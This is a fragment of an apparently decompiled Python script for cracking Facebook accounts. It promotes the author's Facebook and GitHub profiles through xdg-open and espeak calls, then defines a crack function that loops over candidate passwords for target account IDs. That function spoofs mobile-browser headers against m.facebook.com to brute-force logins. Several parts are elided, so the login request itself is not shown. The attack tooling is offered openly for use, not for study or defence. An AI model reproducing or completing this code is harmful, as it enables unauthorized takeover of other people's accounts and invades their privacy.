...
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/profile.php?id=100063820973091')
time.sleep(5)
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92m𝐅𝐨𝐥𝐥𝐨𝐰 𝐦𝐲 𝗚𝗶𝘁𝗵𝘂𝗯 𝐩𝐫𝐨𝐟𝐢𝐥𝐞")
os.system('espeak -a 300 " FOLLOW MY GITHUB PROFILE"')
time.sleep(2)
os.system(f'xdg-open https://github.com/Khorsed12')
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/profile.php?id=100063820973091')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
def crack(idf,pwv):
    ...
    for pw in pwv:
        try:
            ...
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://m.alpha.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
